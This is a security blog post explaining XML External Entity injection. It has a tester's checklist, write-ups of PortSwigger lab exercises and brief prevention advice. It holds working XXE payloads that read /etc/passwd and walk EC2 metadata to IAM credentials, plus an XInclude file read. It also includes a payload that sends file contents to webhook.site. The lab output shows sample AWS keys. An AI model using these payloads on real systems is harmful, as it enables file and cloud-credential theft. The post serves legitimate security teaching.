---
layout: post
title: XXE (XML External Entities) Injection
subtitle: How malicious user can abouse External Entities to perform XXE
date: 2025-07-30 12:43
author: Ren Sie
comments: true
category: injection
cover-img: /assets/img/Post_Cover.png
thumbnail-img: /assets/img/githubpost/xxe_thumb.png
share-img: /assets/img/Post_Cover.png
---
The method isn’t as popular as others because of the patches. But if comes across with application that access and passing XML, worth trying!

{: .box-note}
**Note:** 💡 Try pass XML data to API endpoint. They sometimes accept XML data besides JSON data.

### XML
Some Apps use XML to transfer data. XML has its default entities, which define the way of representing data or special characters. For instance: 
- `&amp;` → `&`
- `&lt;` → `<`
- `&gt;` → `>`

#### **External Entities**
By default, XML has predefined entities to represent special symbols (like `&lt;` for `<`), but **XML External Entities (XXE)** allow users to define **custom entities**. These custom entities can reference **external resources**, such as _local files_ or _external URLs_. This flexibility can be exploited to read sensitive files on the server, or run RCE.  
They can be defined using the `<!ENTITY>` syntax in XML like this:
~~~
xml:
<!ENTITY entity_name SYSTEM "path_to_file_or_url">
~~~
An example of malicious XML can be:
The entity `xxe` in the `creds` document reference the `/etc/passwd`. When the file path (external URL) is passed, it will be places at `&xxe;`.
~~~
xml:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE creds [
<!ELEMENT creds ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<creds><user>&xxe;</user><password>pass</password></creds>
~~~

### Checklist
<details markdown="1">
  <summary>Click me to expand checklist</summary>  

#### Objective

1. **Identify endpoints that can process XML**
   - Send test requests with XML payloads and set Content-Type to `application/xml` or `text/xml`.
   - Inspect response content: `Content-Type: application/xml` or `Content-Type: text/xml` as accepted request headers.

2. **Create a working XML payload that can be adapted to deliver exploits**
   - First create a valid XML structure that the application accepts.
   - Then modify it with malicious content tailored to target the application's XML processing logic.

3. **Test identified endpoints for XXE**

#### Attack surface discovery

1. **Identify endpoints that accept XML payloads**
   - Review requests in proxy for XML data (e.g., Burp Suite).
   - Identify endpoints that accept JSON by sending XML.
   - Identify endpoints that accept images by sending SVG images.
   - Identify endpoints that accept documents by sending DOCX or PDF files.

2. **Test with the header Content-Type: application/xml**

3. **Verify working XML payloads that can be adapted to deliver exploits**
   - Confirm the endpoint accepts and processes XML.
   - Inject harmless modifications to observe behavior changes.

4. **Locate internal DTDs**  
   - <!DOCTYPE ...> that contains `[internal subset]`, `[internal declaring elements]`, `[internal declaring entities]`, or `[attribute rules]`  
  
#### Testing

1. **Test for external entities with a simple non-malicious payload**
   - <!ENTITY harmless SYSTEM "http://example.com/">
   - If the server processes external entities, it will fetch the contents from example.com

2. **Test for external entities with an available file**
   - <!ENTITY password SYSTEM "file:///etc/passwd">

3. **Test for external entities with an available endpoint we control**
   - [Webhook](https://webhook.site/)

4. **Test for external entities with other available endpoints**
   - <!ENTITY ext SYSTEM "http://internal-api.local/admin">

5. **EC2 metadata endpoint http[://]169.254.169.254/latest/meta-data**
   - [Access instance metadata for an EC2 instance](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html)  

6. **Test filters and restrictions**
   - Send common disallowed characters or keywords (e.g., `<`, `<!DOCTYPE>`, `$`, `SYSTEM`, `ENTITY`)
   - Bypass filters using encoding or obfuscation (e.g., URL encoding, Unicode encoding, base64 encoding, null byte insertion, or alternate whitespace characters)
   - Trigger error messages to exfiltrate information (e.g., `<!DOCT`)
   - Nested Parameter Entities with External Payload (e.g., <!ENTITY external_dtd SYSTEM "http://example.com/payload.dtd">)
   - Splitting Payload Across Multiple Parameters

7. **Test for denial of service**
   - [Billion laughs](https://en.wikipedia.org/wiki/Billion_laughs_attack)

8. **Test for code execution**
   - Tag Injection
  
#### Impact

1. **Can we read sensitive files?**
   - Configuration files (e.g., `/etc/passwd`)
   - System files (e.g., `/etc/shadow`)
   - SQLite files
   - SSH keys (e.g., `~/.ssh/id_rsa`)

2. **Can we exfiltrate sensitive information?**
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>  
   <!DOCTYPE foo [  
     <!ENTITY xxe SYSTEM "file:///etc/passwd">  
     <!ENTITY % remote SYSTEM "https://webhook.site/?data=%xxe;">  
     %remote;
   ]>
   <foo>&xxe;</foo>
   ```

3. **Can we achieve code execution?**  
  
</details>

### Labs
Just for demostration, I completed a few labs on [PortSwigger Academy](https://portswigger.net/web-security/all-labs#xml-external-entity-xxe-injection) to show how this vulnerability can lead to:
#### 1. Exploiting XXE using external entities to retrieve files  
I captured and modified `POST /product/stock` with Burp Repeater. Adding the `!DOCTYPE element` that defines an external entity containing the path to the file `etc/passwd`.
   ~~~
   <?xml version="1.0" encoding="UTF-8"?>  
   <!DOCTYPE test [  
   <!ENTITY xxe SYSTEM "file:///etc/passwd">  
   ]>  
   <stockCheck><productId>&xxe;</productId><storeId>2</storeId></stockCheck>  
   ~~~
   > Response:  
   > "Invalid product ID: root:x:0:0:root:/root:/bin/bash  
   > daemon:x:1:1 : daemon :/usr/sbin:/usr/sbin/nologin  
   > bin:x: 2:2 :bin:/bin:/usr/sbin/nologin  
   > sys:x: 3:3 : sys : /dev:/usr/sbin/nologin  
   > sync:x: 4:65534 : sync:/bin:/bin/sync  
   > www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  
   > backup:x: 34:34 :backup:/var/backups:/usr/sbin/nologin  
   > apt:x:100:65534 :: /nonexistent:/usr/sbin/nologin  
   > peter:x:2001:2001 :: /home/peter:/bin/bash  
   > dnsmasq:x:101:65534 :dnsmasq, ,,:/var/lib/misc:/usr/sbin/nologin  
   > messagebus:x:102:101 :: /nonexistent:/usr/sbin/nologin
   
#### 2. Exploiting XXE to perform SSRF attacks  
I captured and modified `POST /product/stock` with Burp Repeater. Adding the `!DOCTYPE element` that defines an external entity `test` to access EC2 instance metadata. More details about what _EC2 instance metadata_ is, visit [Access instance metadata for an EC2 instance](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html)
   ~~~
   < ?xml version="1.0" encoding="UTF-8"?>  
   < !DOCTYPE test [  
   < !ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data">  
   ]>  
   < <stockCheck><productId>&xxe;</productId><storeId>3</storeId></stockCheck>  
   ~~~
   > Response: It tells us there's an "iam" entity inside  
   > "Invalid Product ID:  
   > iam"
   
   ~~~
   < ?xml version="1.0" encoding="UTF-8"?>  
   < !DOCTYPE test [  
   < !ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam">  
   ]>
   < <stockCheck><productId>&xxe;</productId><storeId>3</storeId></stockCheck>
   ~~~
   > Response: It tells us there's an "security-credentials" entity inside  
   > "Invalid Product ID:  
   > security-credentials"

   ~~~
   < ?xml version="1.0" encoding="UTF-8"?>  
   < !DOCTYPE test [  
   < !ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">  
   ]>  
   < <stockCheck><productId>&xxe;</productId><storeId>3</storeId></stockCheck>  
   ~~~
   > Response: It tells us there's an "admin" entity inside  
   > "Invalid Product ID:  
   > admin"  
   
   ~~~
   < ?xml version="1.0" encoding="UTF-8"?>  
   < !DOCTYPE test [  
   < !ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">  
   ]>  
   < <stockCheck><productId>&xxe;</productId><storeId>3</storeId></stockCheck>  
   ~~~
   > Response: We retrieves admin's access key
   > "Code":"Success",  
   > "LastUpdated":"2021-11-15T11:29:31.956206Z",  
   > "Type":"AWS-HMAC",  
   > "AccessKeyId":"BordnBx2QrCdt7VGVWT3",  
   > "SecretAccessKey":"yBZJPYWjn4XFnBLk3fqe305Fqdc7YT3SUs4vomxF",  
   > "Token":"kMW7yE0Z00lCE8zoDhS1rjX0vRBQG0EepbmRtzxmyzW0g8QtJ4j",  
   > "Expiration":"2027-11-14T11:29:31.956206Z"  

{: .box-note}
**Note:** 💡SSRF exploits a server's request-making functionality, allowing user to make a crafted request that pivots from the public-facing application and uses the server's trusted internal network position to scan, access, and exfiltrate data from otherwise unreachable backend services and cloud metadata endpoints.

#### 3. Exploiting XInclude to retrieve files  
   I identified the server-side xml parser by studying `GET /product?productId=3` on Burp Proxy. Insert the `Xinclude namespace` and the filepath to `POST /product/stock` on Repeater.
   ~~~
   productId=<test  
   xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/>  
   </test>&storeId=2
   ~~~
   > Response:  
   > "Invalid product ID: root:x:0:0:root:/root:/bin/bash  
   > daemon:x:1:1 : daemon :/usr/sbin:/usr/sbin/nologin  
   > bin:x: 2:2 :bin:/bin:/usr/sbin/nologin  
   > sys:x: 3:3 : sys : /dev:/usr/sbin/nologin  
   > sync:x: 4:65534 : sync:/bin:/bin/sync  
   > www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  
   > backup:x: 34:34 :backup:/var/backups:/usr/sbin/nologin  
   > apt:x:100:65534 :: /nonexistent:/usr/sbin/nologin  
   > peter:x:2001:2001 :: /home/peter:/bin/bash  
   > dnsmasq:x:101:65534 :dnsmasq, ,,:/var/lib/misc:/usr/sbin/nologin  
   > messagebus:x:102:101 :: /nonexistent:/usr/sbin/nologin

{: .box-note}
**Note:** 💡XInclude is used to bypass DTD-based Mitigation in this instance, If the application is blocking <!DOCTYPE>, an XInclude might still succeed.

### Prevention
1. Disable XML external entity
2. Use JSON instead of XML
3. Validate and Sanitize XML Input (with XSD)
4. Restrict Network/File Access (OS or Container Level)

### Also Read
[WSTG - Testing for XML Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection)
